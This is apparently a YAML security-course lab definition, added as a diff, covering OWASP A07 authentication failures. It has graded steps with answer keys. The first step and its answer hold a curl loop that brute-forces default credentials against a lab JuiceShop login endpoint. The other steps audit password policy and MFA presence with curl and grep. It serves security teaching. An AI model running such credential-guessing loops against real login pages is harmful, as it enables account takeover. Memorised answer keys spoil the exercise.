@@ -1,0 +1,148 @@
+lab_id: standalone-web-vuln-week10
+title: A07 Auth Failures — brute / MFA bypass / 비밀번호 정책
+version: standalone-non-ai
+course: web-vuln
+week: 10
+description: |
+  OWASP A07 — *인증 의 결함* hands-on. JuiceShop login 의 brute (hydra) + GovPortal
+  의 MFA 가능 성 + 비밀번호 정책 audit.
+difficulty: medium
+duration_minutes: 150
+
+steps:
+  - order: 1
+    instruction: |
+      ## 🎯 MISSION — JuiceShop login brute (hydra 5 candidate)
+
+      JuiceShop login 의 *5 candidate brute* (admin/admin, admin/password, etc).
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      echo "=== JuiceShop login brute (5 시도) ==="
+      for cred in "admin@juice-sh.op:admin123" "admin@juice-sh.op:password" "admin@juice-sh.op:admin" "test:test" "user:user"; do
+        email="${cred%:*}"
+        pass="${cred#*:}"
+        code=$(curl -s -o /dev/null -w '%{http_code}' \
+          -X POST -H 'Host: juice.6v6.lab' \
+          -H 'Content-Type: application/json' \
+          -d "{\"email\":\"$email\",\"password\":\"$pass\"}" \
+          http://10.20.30.1/rest/user/login)
+        echo "$cred: $code"
+      done
+      SH
+      ```
+    hint: 5 candidate × login
+    category: exploit
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      for cred in "admin@juice-sh.op:admin123" "test:test"; do
+        email="${cred%:*}"; pass="${cred#*:}"
+        echo "$cred: $(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Host: juice.6v6.lab' -H 'Content-Type: application/json' -d "{\"email\":\"$email\",\"password\":\"$pass\"}" http://10.20.30.1/rest/user/login)"
+      done
+      SH
+    answer_detail: 5 candidate brute
+    verify:
+      type: output_contains
+      expect: 'admin\|200\|401'
+      field: stdout
+      semantic:
+        intent: brute force
+        success_criteria: [5 candidate]
+        acceptable_methods:
+          - "**[OSS] curl loop**"
+          - "**[OSS] hydra http-post-form**"
+          - "**[OSS] CWE-307 Improper Restriction of Excessive Authentication**"
+    target_vm: attacker
+
+  - order: 2
+    instruction: |
+      ## 🎯 MISSION — 비밀번호 정책 audit (6v6 의 7 vhost)
+
+      각 vhost 의 *registration form* 의 *비밀번호 정책* (length / complexity) 분석.
+
+      ## 표준 (NIST SP 800-63B)
+      - min 8 char (recommended 12+)
+      - *복잡도 강제 X* (modern guidance — *length 가 더 중요*)
+      - *압축 dictionary check* (zxcvbn 등)
+      - *no rotation* (NIST 2017 의 변경)
+    hint: registration form 분석
+    category: analysis
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      for h in juice neobank govportal mediforum; do
+        echo "=== $h ==="
+        curl -s -H "Host: $h.6v6.lab" "http://10.20.30.1/register" 2>&1 | grep -iE 'password|minlength|pattern' | head -5
+      done
+      SH
+    answer_detail: 비밀번호 정책 audit
+    verify:
+      type: output_contains
+      expect: 'register\|password'
+      field: stdout
+      semantic:
+        intent: 비밀번호 정책
+        success_criteria: [4 vhost audit]
+        acceptable_methods:
+          - "**[OSS] register form 분석**"
+          - "**[OSS] NIST SP 800-63B 표준**"
+          - "**[OSS] zxcvbn 의 entropy 측정**"
+    target_vm: attacker
+
+  - order: 3
+    instruction: |
+      ## 🎯 MISSION — MFA / 2FA 가능 성 audit (GovPortal)
+
+      GovPortal 의 *MFA UI* 의 존재 여부.
+
+      ```bash
+      ssh 6v6-attacker bash <<'SH'
+      curl -s -H 'Host: govportal.6v6.lab' http://10.20.30.1/ 2>&1 | grep -iE 'mfa|otp|2fa|verification' | head -5
+      SH
+      ```
+    hint: GovPortal 의 MFA UI grep
+    category: analysis
+    points: 25
+    answer: |
+      ssh 6v6-attacker bash <<'SH'
+      curl -s -H 'Host: govportal.6v6.lab' http://10.20.30.1/ 2>&1 | grep -iE 'mfa|otp|2fa|verification' | head -5
+      SH
+    answer_detail: MFA 가능 성 audit
+    verify:
+      type: output_contains
+      expect: 'mfa\|otp\|2fa\|govportal'
+      field: stdout
+      semantic:
+        intent: MFA audit
+        success_criteria: [GovPortal MFA 검색]
+        acceptable_methods:
+          - "**[OSS] grep mfa/otp/2fa**"
+          - "**[OSS] OWASP A07 의 MFA 권장**"
+          - "**[OSS] FIDO2 / WebAuthn 의 modern 표준**"
+    target_vm: attacker
+
+  - order: 4
+    instruction: |
+      ## 🎯 MISSION — W10 보고서 + CWE-287/307/521 매핑
+
+      ```markdown
+      ## 1. brute 5 candidate 결과
+      ## 2. 4 vhost 비밀번호 정책
+      ## 3. GovPortal MFA audit
+      ## 4. 매핑: CWE-287 / CWE-307 / CWE-521
+      ```
+    hint: 3 영역 + CWE 매핑
+    category: synthesis
+    points: 25
+    answer: 위 형식
+    answer_detail: W10 보고서
+    verify:
+      type: output_contains
+      expect: 'CWE-287\|CWE-307'
+      field: stdout
+      semantic:
+        intent: W10 종합
+        success_criteria: [3 영역 + 매핑]
+        acceptable_methods: ["**[관리적] PTES + CWE Top 25**"]
+    target_vm: bastion
